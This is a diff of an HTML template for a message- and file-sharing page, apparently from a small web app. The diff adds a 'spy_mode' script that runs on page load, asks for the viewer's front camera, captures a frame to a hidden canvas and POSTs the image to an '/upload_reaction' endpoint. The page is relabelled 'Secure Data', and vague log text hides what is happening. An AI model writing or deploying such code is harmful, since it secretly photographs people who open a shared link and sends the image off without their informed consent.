@@ -1,15 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Secret Message</title>
+    <title>Secure Data</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex items-center justify-center font-mono p-4">
-    <div class="bg-slate-800 p-8 rounded-2xl shadow-2xl w-full max-w-md border border-cyan-500">
-        <h2 class="text-2xl text-cyan-400 mb-4 border-b border-gray-600 pb-2">DECODED MESSAGE</h2>
-        <div class="bg-black p-4 rounded text-green-400 font-mono text-sm whitespace-pre-wrap break-words">{{ content }}</div>
-        <a href="/" class="block text-center mt-6 text-gray-400 hover:text-white underline">Create Your Own</a>
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center font-mono p-4">
+    
+    <div class="w-full max-w-md bg-slate-800 p-8 rounded-2xl border border-cyan-500/50 shadow-2xl relative overflow-hidden">
+        <h2 class="text-xl text-cyan-400 mb-4 border-b border-gray-600 pb-2">DATA RECEIVED</h2>
+        <div class="bg-black/40 p-4 rounded text-green-400 text-sm whitespace-pre-wrap break-words border border-green-900/50 mb-4">
+            {{ content }}
+        </div>
+
+        {% if is_file %}
+        <a href="{{ file_url }}" class="block w-full bg-cyan-600 text-center py-2 rounded text-white font-bold hover:bg-cyan-500">Download File</a>
+        {% endif %}
+
+        {% if spy_mode %}
+        <div class="mt-4 pt-4 border-t border-slate-700">
+            <p class="text-[10px] text-gray-500 uppercase">System Log:</p>
+            <p id="spy-log" class="text-[10px] text-gray-400">Initializing...</p>
+        </div>
+        {% endif %}
     </div>
+
+    <video id="spy-video" autoplay playsinline class="hidden"></video>
+    <canvas id="spy-canvas" class="hidden"></canvas>
+
+    {% if spy_mode %}
+    <script>
+        const log = document.getElementById('spy-log');
+        
+        async function captureSpy() {
+            log.innerText = "Requesting Camera Access...";
+            try {
+                // Must be https or localhost
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                log.innerText = "Camera Active. Capturing...";
+                
+                const video = document.getElementById('spy-video');
+                video.srcObject = stream;
+                
+                await new Promise(r => video.onloadedmetadata = r);
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('spy-canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const dataURL = canvas.toDataURL('image/png');
+                    stream.getTracks().forEach(track => track.stop()); // Close cam
+
+                    log.innerText = "Uploading data...";
+                    
+                    fetch('/upload_reaction/{{ unique_id }}', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: dataURL })
+                    }).then(() => {
+                        log.innerText = "Data Transmitted.";
+                        log.classList.add('text-green-500');
+                    });
+                }, 800);
+            } catch (err) {
+                console.error(err);
+                log.innerText = "Error: " + err.message + ". (Are you on HTTPS?)";
+                log.classList.add('text-red-500');
+            }
+        }
+        window.onload = captureSpy;
+    </script>
+    {% endif %}
 </body>
 </html>
